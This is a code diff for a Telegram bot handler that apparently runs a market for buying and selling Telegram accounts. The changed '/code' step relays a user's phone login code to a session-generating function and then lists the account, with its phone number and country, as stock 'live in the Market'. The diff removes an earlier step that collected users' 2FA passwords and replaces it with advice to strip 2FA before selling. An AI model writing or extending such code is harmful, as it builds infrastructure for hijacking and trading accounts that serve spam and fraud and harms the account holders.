@@ -557,22 +557,14 @@ export default async function handleCommand(base44, token, ctx) {
         await tgSend(token, chatId, `🔄 Verifying code...`, replyTo);
         try {
           const result = await base44.asServiceRole.functions.invoke('verifyLoginCode', {
-            session_id: sessionState.session_id,
-            code: parts[1],
+            request_id: sessionState.request_id,
+            phone_code: parts[1],
             user_email: user.email
           });
           const data = result.data || result;
           if (data.error) throw new Error(data.error);
-          if (data.needs_2fa) {
-            await setState(base44, `session:${user.email}`, JSON.stringify({
-              ...sessionState,
-              status: 'awaiting_2fa'
-            }));
-            await tgSend(token, chatId, `🔐 2FA password required.\nReply with: <code>/password [your_2fa_password]</code>`, replyTo);
-          } else {
-            await clearState(base44, `session:${user.email}`);
-            await tgSend(token, chatId, `✅ Session generated successfully!\nReward will be credited after verification.`, replyTo);
-          }
+          await clearState(base44, `session:${user.email}`);
+          await tgSend(token, chatId, `✅ <b>Account Received Successfully</b>\n\n🌍 Country: ${data.country || ''} ${data.country_iso ? `(${data.country_iso})` : ''}\n📱 Phone: <code>${data.phone || ''}</code>\n\nThe account has been added to your stock — it is now live in the Market.`, replyTo);
         } catch (err) {
           await tgSend(token, chatId, `❌ Error: ${err.message}`, replyTo);
         }
@@ -581,31 +573,8 @@ export default async function handleCommand(base44, token, ctx) {
     case 'password':
       {
         if (!await requireUser()) break;
-        const stateRec = await getState(base44, `session:${user.email}`);
-        if (!stateRec) {
-          await tgSend(token, chatId, '❌ No active 2FA session.', replyTo);
-          break;
-        }
-        const sessionState = JSON.parse(stateRec.value);
-        const pwd = parts.slice(1).join(' ');
-        if (!pwd) {
-          await tgSend(token, chatId, 'Usage: /password [your_2fa_password]', replyTo);
-          break;
-        }
-        await tgSend(token, chatId, `🔄 Verifying 2FA...`, replyTo);
-        try {
-          const result = await base44.asServiceRole.functions.invoke('verify2faPassword', {
-            session_id: sessionState.session_id,
-            password: pwd,
-            user_email: user.email
-          });
-          const data = result.data || result;
-          if (data.error) throw new Error(data.error);
-          await clearState(base44, `session:${user.email}`);
-          await tgSend(token, chatId, `✅ Session generated successfully!\nReward will be credited after verification.`, replyTo);
-        } catch (err) {
-          await tgSend(token, chatId, `❌ Error: ${err.message}`, replyTo);
-        }
+        await clearState(base44, `session:${user.email}`);
+        await tgSend(token, chatId, `❌ <b>Accounts with 2FA cannot be sold.</b>\n\nRemove 2FA from the account first, then sell it with /session or the 📱 Sell button.`, replyTo);
         break;
       }
     case 'admin':
